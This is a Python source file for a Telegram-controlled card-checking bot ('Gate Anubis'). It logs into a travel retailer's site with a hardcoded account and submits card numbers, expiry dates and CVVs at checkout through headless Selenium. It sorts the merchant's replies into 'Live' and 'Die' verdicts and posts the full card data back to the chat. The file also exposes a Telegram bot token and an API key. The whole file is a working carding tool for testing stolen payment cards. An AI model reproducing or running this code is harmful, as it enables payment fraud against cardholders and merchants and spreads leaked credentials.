import threading
import indexBot
import time
import sys
import requests
import json
import re
import os
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys

############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############

#tor_proxy = "127.0.0.1:9150"
options = webdriver.ChromeOptions()
options.binary_location = os.environ.get("GOOGLE_CHROME_BIN")
options.add_argument("--log-level=3")
options.add_argument("--disable-extensions");
options.add_argument("test-type");
options.add_argument('headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument("--disable-single-click-autofill");
options.add_argument("--disable-autofill-keyboard-accessory-view[8]");
options.add_experimental_option('excludeSwitches', ['enable-logging'])

#options.add_argument('--ignore-certificate-errors')
#options.add_argument('disable-infobars')
#options.add_argument("--incognito")
#options.add_argument('--user-data=C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default')
#options.add_argument('--proxy-server=socks5://%s' % tor_proxy)

token = '1907345065:AAEZf1TF-EhbSvl1rsHTY6vyh_WFoASrAIc'
magnito_bot = indexBot.BotHandler(token) 
class gate_Anubis(threading.Thread):

    def __init__(self,message,cid,mid, *args, **kwargs,):
        super(gate_Anubis, self).__init__(*args, **kwargs)
        self._stop = threading.Event()
        self.message = message
        self.cid = cid
        self.mid = mid
  
    def stop(self):
        self._stop.set()
    def stopped(self):
        return self._stop.isSet()
    
    def run(self):
        mymessage = self.message
        driver = webdriver.Chrome(executable_path=os.environ.get("CHROMEDRIVER_PATH"), chrome_options=options)
        driver.get("https://www.awaytravel.com/login")
        time.sleep(1)

        magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n- Iniciando Sesion 🔑\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)

        driver.find_element_by_id('content').click()
        
        WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, 'login-email'))).send_keys('pardoshirt@gmail.com')
        WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, 'login-password'))).send_keys('colombia20')
        driver.find_element_by_xpath('//*[@id="content"]/div/div/form/div[4]/button').click()
        magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n- Enviando Datos ✈️\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
        ward = True
        while ward == True:
            valid = driver.find_element_by_xpath('/html').text
            if 'Logged in successfully' in valid:
                magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n- Inicio Exitoso ✅\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                ward = False

        
        ccn = mymessage[0:16]
        mescc = mymessage[16:18]
        anocc = mymessage[20:22]
        cvv= mymessage[22:25]
        binsend = ccn[0:6]
        magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n- Agregando Tarjeta 💳\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
        binIfo = requests.get('https://api.iinapi.com/iin?key=G1QUbahVM5Y9hOksrmGRS9Nhas7OC5Mg&digits='+binsend).text
        x = json.loads(binIfo)
        brand = x['result']['CardBrand']
        bank = x['result']['IssuingInstitution']
        cardType = x['result']['CardType']
        cardCategory = x['result']['CardCategory']
        country = x['result']['IssuingCountry']
        driver.get('https://www.awaytravel.com/checkout/payment')
        time.sleep(1)
        iframes = driver.find_elements_by_xpath("//iframe[@title='Secure card number input frame']")
        driver.switch_to.frame(iframes[0])
        driver.find_element_by_name('cardnumber').send_keys(ccn)
        driver.switch_to.default_content()
        iframes = driver.find_elements_by_xpath("//iframe[@title='Secure CVC input frame']")
        driver.switch_to.frame(iframes[0])
        driver.find_element_by_name('cvc').send_keys(cvv)
        driver.switch_to.default_content()
        iframes = driver.find_elements_by_xpath("//iframe[@title='Secure expiration date input frame']")
        driver.switch_to.frame(iframes[0])
        driver.find_element_by_name('exp-date').send_keys(mescc+' / '+anocc)
        driver.switch_to.default_content()
        driver.find_element_by_id('checkout-payment-submit').click()
        magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n- Esperando Respuesta...🔮\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)

        ward = True
        while ward == True:
            valid = driver.find_element_by_id('content').text
            try:
                confirm = driver.find_element_by_id('checkout_form_confirm').get_attribute('action')
                if '/checkout/update/confirm' in confirm:
                    magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n[🚀ASSOCIATED] - <code>'+ccn+'|'+mescc+'|'+anocc+'|'+cvv+'</code>\nStatus -» Approved!🚀\n\n🔎 Detalles\nBin -» '+brand+" - "+cardType+" - "+cardCategory+'\nBank -» '+bank+'\nCountry -» '+country+'\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                    ward = False
                    driver.quit()
            except:
                if 'security code is incorrect' in valid:
                    magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n[✅Live] - <code>'+ccn+'|'+mescc+'|'+anocc+'|'+cvv+'</code>\nStatus -» Secure Code Incorrect!✅\n\n🔎 Detalles\nBin -» '+brand+" - "+cardType+" - "+cardCategory+'\nBank -» '+bank+'\nCountry -» '+country+'\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                    ward = False
                    driver.quit()
                elif 'Your card was declined' in valid:
                    magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n[❌Die] - <code>'+ccn+'|'+mescc+'|'+anocc+'|'+cvv+'</code>\nStatus -» Declined!❌\n\n🔎 Detalles\nBin -» '+brand+" - "+cardType+" - "+cardCategory+'\nBank -» '+bank+'\nCountry -» '+country+'\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                    ward = False
                    driver.quit()
                elif 'Your card has expired.' in valid:
                    magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n[🌐Expired] - <code>'+ccn+'|'+mescc+'| '+anocc+'|'+cvv+'</code>\nStatus -» Expired Card!🌐\n\n🔎 Detalles\nBin -» '+brand+" - "+cardType+" - "+cardCategory+'\nBank -» '+bank+'\nCountry -» '+country+'\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                    ward = False
                    driver.quit()
                elif 'Your card number is incorrect' in valid:
                    magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n[⚠️Invalid] - <code>'+ccn+'|'+mescc+'|'+anocc+'|'+cvv+'</code>\nStatus -» Invalid Credit Card Number!⚠️\n\n🔎 Detalles\nBin -» '+brand+" - "+cardType+" - "+cardCategory+'\nBank -» '+bank+'\nCountry -» '+country+'\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                    ward = False
                    driver.quit()
                elif 'Your card does not support this type of purchase.' in valid:
                    magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n[🚧Not Allowed] - <code>'+ccn+'|'+mescc+'|'+anocc+'|'+cvv+'</code>\nStatus -» Transaction Not Allowed!🚧\n\n🔎 Detalles\nBin -» '+brand+" - "+cardType+" - "+cardCategory+'\nBank -» '+bank+'\nCountry -» '+country+'\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                    ward = False
                    driver.quit()
                elif 'An error occurred while processing your card.' in valid:
                    magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n[❌Die] - <code>'+ccn+'|'+mescc+'|'+anocc+'|'+cvv+'</code>\nStatus -» Processing_error❌\n\n🔎 Detalles\nBin -» '+brand+" - "+cardType+" - "+cardCategory+'\nBank -» '+bank+'\nCountry -» '+country+'\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                    ward = False
                    driver.quit()
                elif 'Could not obtain lock on order' in valid:
                    magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n[🧸TRY AGAIN] - <code>'+ccn+'|'+mescc+'|'+anocc+'|'+cvv+'</code>\nStatus -» Could not obtain lock on order!⚠️\n\n🔎 Detalles\nBin -» '+brand+" - "+cardType+" - "+cardCategory+'\nBank -» '+bank+'\nCountry -» '+country+'\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                    ward = False
                    driver.quit()
                elif 'Your card number is invalid' in valid:
                    magnito_bot.edit_message_text('<b>⚜️ Gate Anubis ⚜️\n\n[⚠️Invalid] - <code>'+ccn+'|'+mescc+'|'+anocc+'|'+cvv+'</code>\nStatus -» Invalid Credit Card Number!⚠️\n\n🔎 Detalles\nBin -» '+brand+" - "+cardType+" - "+cardCategory+'\nBank -» '+bank+'\nCountry -» '+country+'\n\n🔱Bot by --» @Raulshp</b>',self.cid,self.mid)
                    ward = False
                    driver.quit()
            pass
        driver.quit()
        sys.exit(0)


def start(message,cid,mid):
    mid = mid+1
    t1 = gate_Anubis(message,cid,mid)
    t1.start()
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############
############## BYRAULSHP ##############